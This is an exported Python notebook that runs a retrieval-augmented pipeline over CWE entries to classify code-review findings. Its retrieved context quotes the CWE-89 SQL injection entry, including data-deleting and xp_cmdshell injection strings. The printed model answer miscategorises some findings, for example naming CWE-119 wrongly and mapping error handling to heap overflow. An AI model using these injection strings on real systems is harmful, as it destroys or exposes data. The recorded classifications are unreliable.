# Add of existing embedding ID: CWE-763
# Add of existing embedding ID: CWE-764
# Add of existing embedding ID: CWE-765
# Add of existing embedding ID: CWE-766
# Add of existing embedding ID: CWE-767
# Add of existing embedding ID: CWE-768
# Add of existing embedding ID: CWE-769
# Add of existing embedding ID: CWE-77
# Add of existing embedding ID: CWE-770
# Add of existing embedding ID: CWE-771
# Add of existing embedding ID: CWE-772
# Add of existing embedding ID: CWE-773
# Add of existing embedding ID: CWE-774
# Add of existing embedding ID: CWE-775
# Add of existing embedding ID: CWE-776
# Add of existing embedding ID: CWE-777
# Add of existing embedding ID: CWE-778
# Add of existing embedding ID: CWE-779
# Add of existing embedding ID: CWE-78
# Add of existing embedding ID: CWE-780
# Add of existing embedding ID: CWE-781
# Add of existing embedding ID: CWE-782
# Add of existing embedding ID: CWE-783
# Add of existing embedding ID: CWE-784
# Add of existing embedding ID: CWE-785
# Add of existing embedding ID: CWE-786
# Add of existing embedding ID: CWE-787
# Add of existing embedding ID: CWE-788
# Add of existing embedding ID: CWE-789
# Add of existing embedding ID: CWE-79
# Add of existing embedding ID: CWE-790
# Add of existing embedding ID: CWE-791
# Add of existing embedding ID: CWE-792
# Add of existing embedding ID: CWE-793
# Add of existing embedding ID: CWE-794
# Add of existing embedding ID: CWE-795
# Add of existing embedding ID: CWE-796
# Add of existing embedding ID: CWE-797
# Add of existing embedding ID: CWE-798
# Add of existing embedding ID: CWE-799
# Add of existing embedding ID: CWE-8
# Add of existing embedding ID: CWE-80
# Add of existing embedding ID: CWE-804
# Add of existing embedding ID: CWE-805
# Add of existing embedding ID: CWE-806
# Add of existing embedding ID: CWE-807
# Add of existing embedding ID: CWE-81
# Add of existing embedding ID: CWE-82
# Add of existing embedding ID: CWE-820
# Add of existing embedding ID: CWE-821
# Add of existing embedding ID: CWE-822
# Add of existing embedding ID: CWE-823
# Add of existing embedding ID: CWE-824
# Add of existing embedding ID: CWE-825
# Add of existing embedding ID: CWE-826
# Add of existing embedding ID: CWE-827
# Add of existing embedding ID: CWE-828
# Add of existing embedding ID: CWE-829
# Add of existing embedding ID: CWE-83
# Add of existing embedding ID: CWE-830
# Add of existing embedding ID: CWE-831
# Add of existing embedding ID: CWE-832
# Add of existing embedding ID: CWE-833
# Add of existing embedding ID: CWE-834
# Add of existing embedding ID: CWE-835
# Add of existing embedding ID: CWE-836
# Add of existing embedding ID: CWE-837
# Add of existing embedding ID: CWE-838
# Add of existing embedding ID: CWE-839
# Add of existing embedding ID: CWE-84
# Add of existing embedding ID: CWE-841
# Add of existing embedding ID: CWE-842
# Add of existing embedding ID: CWE-843
# Add of existing embedding ID: CWE-85
# Add of existing embedding ID: CWE-86
# Add of existing embedding ID: CWE-862
# Add of existing embedding ID: CWE-863
# Add of existing embedding ID: CWE-87
# Add of existing embedding ID: CWE-88
# Add of existing embedding ID: CWE-89
# Add of existing embedding ID: CWE-9
# Add of existing embedding ID: CWE-90
# Add of existing embedding ID: CWE-908
# Add of existing embedding ID: CWE-909
# Add of existing embedding ID: CWE-91
# Add of existing embedding ID: CWE-910
# Add of existing embedding ID: CWE-911
# Add of existing embedding ID: CWE-912
# Add of existing embedding ID: CWE-913
# Add of existing embedding ID: CWE-914
# Add of existing embedding ID: CWE-915
# Add of existing embedding ID: CWE-916
# Add of existing embedding ID: CWE-917
# Add of existing embedding ID: CWE-918
# Add of existing embedding ID: CWE-92
# Add of existing embedding ID: CWE-920
# Add of existing embedding ID: CWE-921
# Add of existing embedding ID: CWE-922
# Add of existing embedding ID: CWE-923
# Add of existing embedding ID: CWE-924
# Add of existing embedding ID: CWE-925
# Add of existing embedding ID: CWE-926
# Add of existing embedding ID: CWE-927
# Add of existing embedding ID: CWE-93
# Add of existing embedding ID: CWE-939
# Add of existing embedding ID: CWE-94
# Add of existing embedding ID: CWE-940
# Add of existing embedding ID: CWE-941
# Add of existing embedding ID: CWE-942
# Add of existing embedding ID: CWE-943
# Add of existing embedding ID: CWE-95
# Add of existing embedding ID: CWE-96
# Add of existing embedding ID: CWE-97
# Add of existing embedding ID: CWE-98
# Add of existing embedding ID: CWE-99

# %%
# Function to query the ChromaDB collection
def query_chromadb(query_text, n_results=3):
    """
    Query the ChromaDB collection for relevant documents.
    
    Args:
        query_text (str): The input query.
        n_results (int): The number of top results to return.
    
    Returns:
        list of dict: The top matching documents and their metadata.
    """
    results = collection.query(
        query_texts=[query_text],
        n_results=n_results
    )
    return results["documents"], results["metadatas"]

# Function to interact with the Ollama LLM
def query_ollama(prompt):
    """
    Send a query to Ollama and retrieve the response.
    
    Args:
        prompt (str): The input prompt for Ollama.
    
    Returns:
        str: The response from Ollama.
    """
    llm = OllamaLLM(model=llm_model, temperature=0, num_predict=20000)
    return llm.invoke(prompt)

# RAG pipeline: Combine ChromaDB and Ollama for Retrieval-Augmented Generation
def rag_pipeline(query_text):
    """
    Perform Retrieval-Augmented Generation (RAG) by combining ChromaDB and Ollama.
    
    Args:
        query_text (str): The input query.
    
    Returns:
        str: The generated response from Ollama augmented with retrieved context.
    """
    # Step 1: Retrieve relevant documents from ChromaDB
    retrieved_docs, metadata = query_chromadb(query_text)
    
    # Combine all retrieved documents into a single context string
    if retrieved_docs:
        context = "\n\n".join([doc[0] for doc in retrieved_docs])  # Join all documents with double newlines
    else:
        context = "No relevant documents found."

    # Step 2: Send the query along with the context to Ollama
    augmented_prompt = f"Context: {context}\n\nQuestion: {query_text}\nAnswer:"
    print("######## Augmented Prompt ########")
    print(augmented_prompt)

    response = query_ollama(augmented_prompt)
    return response

# %%
# Define a query to test the RAG pipeline
query = """ 
Classify the CWE class reading points below
1. Unvalidated user input: In several test methods (e.g., `testCssImageNoBaseHref`, `testCssImageWithBaseHref`, etc.), the `$value` parameter is not validated or sanitized before being used to set a property on the `Style` object. This could lead to potential security issues if an attacker were able to inject malicious input.
2. Lack of error handling: In some test methods (e.g., `testOpacity`, `testZIndex`, etc.), the code assumes that the `set_prop()` method will always succeed, but it does not handle cases where the property is invalid or cannot be set. This could lead to unexpected behavior or errors if an attacker were able to inject malicious input.
3. Potential for infinite loops: In the `testWordBreakBreakWord` method, the code sets two properties on the `Style` object (`overflow_wrap` and `word_break`) with values that are not validated or sanitized. If an attacker were able to inject malicious input, it could potentially lead to an infinite loop.
4. Potential for security vulnerabilities in third-party libraries**: The Dompdf library itself may have security vulnerabilities that are not addressed by the test code.
""" # Change the query as needed
response = rag_pipeline(query)
print("######## Response from LLM ########\n", response)
# Out:
# ######## Augmented Prompt ########
# Context: CWE-89
# Name: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
# Description: The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data.
#
#
# Common Consequences:
# Confidentiality: Execute Unauthorized Code or Commands - Adversaries could execute system commands, typically by changing the SQL statement to redirect output to a file that can then be executed.
# Confidentiality: Read Application Data - Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL injection vulnerabilities.
# Authentication: Gain Privileges or Assume Identity - If poor SQL commands are used to check user names and passwords or perform other kinds of authentication, it may be possible to connect to the product as another user with no previous knowledge of the password.
# Access Control: Bypass Protection Mechanism - If authorization information is held in a SQL database, it may be possible to change this information through the successful exploitation of a SQL injection vulnerability.
# Integrity: Modify Application Data - Just as it may be possible to read sensitive information, it is also possible to modify or even delete this information with a SQL injection attack.
#
# Potential Mitigations:
# Step 1: Architecture and Design - Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.
# Step 2: Architecture and Design - If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated. Process SQL queries using prepared statements, parameterized queries, or stored procedures. These features should accept parameters or variables and support strong typing. Do not dynamically construct and execute query strings within these features using "exec" or similar functionality, since this may re-introduce the possibility of SQL injection. [REF-867]
# Step 3: Architecture and Design - Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations. Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.
# Step 4: Architecture and Design - For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
# Step 5: Implementation - While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88). Instead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection. For MySQL, the mysql_real_escape_string() API function is available in both C and PHP.
# Step 6: Implementation - Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue." Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When constructing SQL query strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping. Note that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name "O'Reilly" would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the "'" apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded. When feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes.
# Step 7: Architecture and Design - When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.
# Step 8: Implementation - Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success. If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not. In the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings.
# Step 9: Operation - Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
# Step 10: Operation - When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.
#
# Detection Methods:
# Automated Static Analysis:  (Effectiveness: )
# Automated Dynamic Analysis: This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results. (Effectiveness: Moderate)
# Manual Analysis: Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large. (Effectiveness: )
# Automated Static Analysis - Binary or Bytecode:  (Effectiveness: High)
# Dynamic Analysis with Automated Results Interpretation:  (Effectiveness: High)
# Dynamic Analysis with Manual Results Interpretation:  (Effectiveness: SOAR Partial)
# Manual Static Analysis - Source Code:  (Effectiveness: High)
# Automated Static Analysis - Source Code:  (Effectiveness: High)
# Architecture or Design Review:  (Effectiveness: High)
#
# Demonstrative Examples:
# In 2008, a large number of web servers were compromised using the same SQL injection attack string. This single string worked against many different programs. The SQL injection was then used to modify the web sites to serve malicious code.
# The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user.
# ...string userName = ctx.getAuthenticatedUserName();string query = "SELECT * FROM items WHERE owner = '" + userName + "' AND itemname = '" + ItemName.Text + "'";sda = new SqlDataAdapter(query, conn);DataTable dt = new DataTable();sda.Fill(dt);...
# The query that this code intends to execute follows:
# SELECT * FROM items WHERE owner = <userName> AND itemname = <itemName>;
# However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string:
# name' OR 'a'='a
# for itemName, then the query becomes the following:
# SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';
# The addition of the:
# OR 'a'='a
# condition causes the WHERE clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:
# SELECT * FROM items;
# This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner.
# This example examines the effects of a different malicious value passed to the query constructed and executed in the previous example.
# If an attacker with the user name wiley enters the string:
# name'; DELETE FROM items; --
# for itemName, then the query becomes the following two queries:
# SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';DELETE FROM items;
#                      --'
# Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.
# Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in the previous example.
# If an attacker enters the string
# name'; DELETE FROM items; SELECT * FROM items WHERE 'a'='a
# Then the following three valid statements will be created:
# SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';DELETE FROM items;SELECT * FROM items WHERE 'a'='a';
# One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allowlist of safe values or identify and escape a denylist of potentially malicious values. Allowlists can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, denylisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:
#
#
# Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.
# Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they do not protect against many others. For example, the following PL/SQL procedure is vulnerable to the same SQL injection attack shown in the first example.
# procedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm in varchar2)is open itm_cv for' SELECT * FROM items WHERE ' || 'owner = '|| usr || ' AND itemname = ' || itm || ';end get_item;
# Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.
# MS SQL has a built in function that enables shell command execution. An SQL injection in such a context could be disastrous. For example, a query of the form:
# SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input' ORDER BY PRICE
# Where $user_input is taken from an untrusted source.
# If the user provides the string:
# '; exec master..xp_cmdshell 'dir' --
# The query will take the following form:
# SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=''; exec master..xp_cmdshell 'dir' --' ORDER BY PRICE
# Now, this query can be broken down into:
#
#
# As can be seen, the malicious input changes the semantics of the query into a query, a shell command execution and a comment.
# This code intends to print a message summary given the message ID.
# $id = $_COOKIE["mid"];mysql_query("SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'");
# The programmer may have skipped any input validation on $id under the assumption that attackers cannot modify the cookie. However, this is easy to do with custom client code or even in the web browser.
# While $id is wrapped in single quotes in the call to mysql_query(), an attacker could simply change the incoming mid cookie to:
# 1432' or '1' = '1
# This would produce the resulting query:
# SELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'
# Not only will this retrieve message number 1432, it will retrieve all other messages.
# In this case, the programmer could apply a simple modification to the code to eliminate the SQL injection:
# $id = intval($_COOKIE["mid"]);mysql_query("SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'");
# However, if this code is intended to support multiple users with different message boxes, the code might also need an access control check (CWE-285) to ensure that the application user has the permission to see that message.
# This example attempts to take a last name provided by a user and enter it into a database.
# $userKey = getUserID();$name = getUserInput();
#
#                      # ensure only letters, hyphens and apostrophe are allowed
#                      $name = allowList($name, "^a-zA-z'-$");$query = "INSERT INTO last_names VALUES('$userKey', '$name')";
# While the programmer applies an allowlist to the user input, it has shortcomings. First of all, the user is still allowed to provide hyphens, which are used as comment structures in SQL. If a user specifies "--" then the remainder of the statement will be treated as a comment, which may bypass security logic. Furthermore, the allowlist permits the apostrophe, which is also a data / command separator in SQL. If a user supplies a name with an apostrophe, they may be able to alter the structure of the whole statement and even change control flow of the program, possibly accessing or modifying confidential information. In this situation, both the hyphen and apostrophe are legitimate characters for a last name and permitting them is required. Instead, a programmer may want to use a prepared statement or apply an encoding routine to the input to prevent any data / directive misinterpretations.
#
# Related Weaknesses:
# This CWE is child of 943
# This CWE is child of 74
#
# Question:
# Classify the CWE class reading points below
# 1. Unvalidated user input: In several test methods (e.g., `testCssImageNoBaseHref`, `testCssImageWithBaseHref`, etc.), the `$value` parameter is not validated or sanitized before being used to set a property on the `Style` object. This could lead to potential security issues if an attacker were able to inject malicious input.
# 2. Lack of error handling: In some test methods (e.g., `testOpacity`, `testZIndex`, etc.), the code assumes that the `set_prop()` method will always succeed, but it does not handle cases where the property is invalid or cannot be set. This could lead to unexpected behavior or errors if an attacker were able to inject malicious input.
# 3. Potential for infinite loops: In the `testWordBreakBreakWord` method, the code sets two properties on the `Style` object (`overflow_wrap` and `word_break`) with values that are not validated or sanitized. If an attacker were able to inject malicious input, it could potentially lead to an infinite loop.
# 4. Potential for security vulnerabilities in third-party libraries**: The Dompdf library itself may have security vulnerabilities that are not addressed by the test code.
#
# Answer:
# ######## Response from LLM ########
#  Based on the provided text, I will classify each CWE class reading point as follows:
#
# 1. **Unvalidated user input**:
# 	* CWE Class: 20 (Improper Input Validation)
# 	* Description: The `$value` parameter is not validated or sanitized before being used to set a property on the `Style` object.
# 2. **Lack of error handling**:
# 	* CWE Class: 119 (Incorrect Result Size Determination) / 122 (Heap Overflow)
# 	* Description: The code assumes that the `set_prop()` method will always succeed, but it does not handle cases where the property is invalid or cannot be set.
# 3. **Potential for infinite loops**:
# 	* CWE Class: 835 (Infinite Loop)
# 	* Description: If an attacker were able to inject malicious input, it could potentially lead to an infinite loop when setting properties on the `Style` object.
# 4. **Potential for security vulnerabilities in third-party libraries**:
# 	* CWE Class: 676 (Use of Potentially Dangerous Function)
# 	* Description: The Dompdf library itself may have security vulnerabilities that are not addressed by the test code.
#
# Note that these classifications are based on the provided text and might not be exhaustive or definitive.
